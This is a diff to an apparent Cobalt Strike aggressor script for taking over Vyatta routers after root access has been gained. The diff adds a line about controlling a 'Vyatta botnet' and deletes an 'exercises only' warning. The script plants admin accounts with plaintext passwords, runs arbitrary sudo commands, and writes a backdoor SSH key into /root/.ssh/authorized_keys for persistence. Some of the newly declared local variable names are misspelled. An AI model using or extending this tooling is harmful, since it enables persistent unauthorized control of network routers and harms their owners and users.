@@ -7,17 +7,18 @@
 # Description: Cobalt Strike interface for Vyatta Routers you have gained root access to.
 # 1. Get root ssh shell to the vyatta
 # 2. Right click -> Mark As Vyatta
+# 3. Control your Vyatta botnet using the tab
 #
 # Next Features:
-# 1. Upload and run vyatta script
-# 2. Enumerate Router Function
-# 3. Monitor Mode? 
+# 1. Enumerate Router Function
+# 2. Monitor Mode? 
 #
-# WARNINGS: When you use this tool, the local vyatta user will lose control over configuration. 
-#	    When you make config changes, it affects permissions on the files. THIS IS FOR EXERCISES!
+# WARNINGS: When you use this tool, the local vyatta user will lose control over configuration until reboot. 
+#	    When you make config changes, it affects permissions on the files.
 # 	    Also, this will not work as a non-priv vyatta user in its' current state.
 #
-#global('@vys $beg $end $table $output');
+
+global('@vys $beg $end $table $output');
 $beg = 'sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper begin; sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper';
 $end = 'sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper commit;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper save;sudo /opt/vyatta/sbin/vyatta-cfg-cmd-wrapper end;';
 @vys = @();
@@ -60,24 +61,28 @@ on shell {
 
 #string that will be used to add user
 sub add_user_cmd {
+	local('$vmcd');
 	$vcmd = "$beg set system login user $1 authentication plaintext-password $2\; $end";
 	return $vcmd;
 }
 
 #string for making user the admin
 sub elevate_user_cmd {
+	local('$vmcd');
 	$vcmd = "$beg set system login user $1 level admin\; $end";
 	return $vcmd;
 }
 
 #string for removing a user
 sub remove_user_cmd {
+	local('$vmcd');
 	$vcmd = "$beg delete system login user $1\;$end";
 	return $vcmd;
 }
 
 #string for running a generic vyatta command
 sub generic_vbash_cmd {
+	local('$vmcd');
 	$vcmd = "$beg $1\;$end";
 	return $vcmd;
 }
@@ -97,8 +102,10 @@ sub add_user {
 		s_cmd($sess_id,add_user_cmd($username , $password));
 		s_cmd($sess_id,elevate_user_cmd($username));
 		println ("[*] added $username : $password as an admin on session $sess_id!");
+		show_message("Added $username : $password as an admin on session $sess_id!");
 	}
 	else {
+		show_message("Error: $sess_id is not a valid shell session!");
 		println ("[!] $sess_id is not a valid shell session!");
 	}		
 
@@ -111,9 +118,11 @@ sub remove_user {
 	$username = $2;
 	if(-isshell $sess_id){
 		s_cmd($sess_id,remove_user_cmd($username , $password));
-		println ("[*] removed $username on session $sess_id !");
+		show_message("Removed $username on session $sess_id!");
+		println ("[*] removed $username on session $sess_id!");
 	}
 	else {
+		show_message("Error: $sess_id is not a valid shell session!");
 		println ("[!] $sess_id is not a valid shell session!");
 	}
 }
@@ -125,9 +134,11 @@ sub run_vbash_cmd {
 	$user_cmd = $2;
 	if(-isshell $sess_id){
 		s_cmd($sess_id, generic_vbash_cmd($user_cmd));
-		println ("[*] ran Vyatta command on session $sess_id !");
+		show_message("Ran Vyatta command on session $sess_id!");
+		println ("[*] ran Vyatta command on session $sess_id!");
 	}
 	else {
+		show_message("Error: $sess_id is not a valid shell session!");
 		println ("[!] $sess_id is not a valid shell session!");
 	}	
 }
@@ -139,9 +150,11 @@ sub run_bash_cmd {
 	$user_cmd = $2;
 	if(-isshell $sess_id){
 		s_cmd($sess_id, "sudo $user_cmd");
-		println ("[*] ran bash command on session $sess_id !");
+		show_message("Ran Bash command on session $sess_id!");
+		println ("[*] ran bash command on session $sess_id!");
 	}
 	else {
+		show_message("Error: $sess_id is not a valid shell session!");
 		println ("[!] $sess_id is not a valid shell session!");
 	}	
 }
@@ -154,9 +167,11 @@ sub backdoor_key {
 	if(-isshell $sess_id){
 		s_cmd($1, "sudo mkdir /root/.ssh");
 		s_cmd($1, "sudo echo $pubkey > /root/.ssh/authorized_keys");
-		println ("[*] backdoor root ssh key added on $sess_id !");
+		show_message("Backdoor root ssh key added on $sess_id !");
+		println ("[*] backdoor root ssh key added on $sess_id!");
 	}
 	else {
+		show_message("Error: $sess_id is not a valid shell session!");
 		println ("[!] $sess_id is not a valid shell session!");
 	}
 
@@ -164,7 +179,7 @@ sub backdoor_key {
 
 #add a vyatta to the table
 sub add_vy {
-	local('$session $addr $sessiondata $alreadythere');
+	local('$session $addr $sessiondata $alreadythere %label $newval');
 	$addr = $1;
 	$session = host_session($1);
 	$sessiondata = $null;
@@ -228,7 +243,7 @@ sub vyatta_tab {
 
 #handle any button clicks on our tab
 on tab_table_click {
-
+	local('$un $pass $cmd $keyname $handle $pubkey');
 	if ($3 eq "Refresh") {
 		refresh_tab_table();
 	}
@@ -271,9 +286,11 @@ on tab_table_click {
 		}
 	}
 	if($3 eq "Enable Output") {
+		show_message("Output Enabled! Beware of lots of tabs...");
 		$output = 1;
 	}
 	if($3 eq "Disable Output") {
+		show_message("Output Disabled");
 		$output = 0;
 	}
 	if ($3 eq "Run Bash Cmd") {
@@ -298,7 +315,7 @@ on tab_table_click {
 
 #refresh the table based upon our global list of vyattas
 sub refresh_tab_table {
-	local('@vy @tablevy');
+	local('@vy @tablevy $session');
 	
 	#clear old data in database
 	data_clear("vys");
@@ -355,7 +372,6 @@ command vyclear {
 #====================
 #Change the image for all vyatta devices
 filter host_image {
-
     local('$addr');
     $addr = $2['address'];
 
@@ -364,11 +380,11 @@ filter host_image {
 	if(@vy[0] eq $addr){	
 		# Check subdir first
 		if (-exists script_resource("/vy_con/vy.png")){
-		# change its host icon
+			# change its host icon
 			push($1, script_resource("/vy_con/vy.png"));
 		}
 		else{
-		#assume local
+			#assume local
 			push($1, script_resource("vy.png"));
 		}
         }
@@ -388,6 +404,7 @@ popup main_middle {
 
 #right click menu on our table
 popup vytab_menu {
+	local('$note $addr');
 	item "Change Note"{
 		$note = prompt_text("New Note:");
 		$addr = table_selected_single($table, "host")[0];
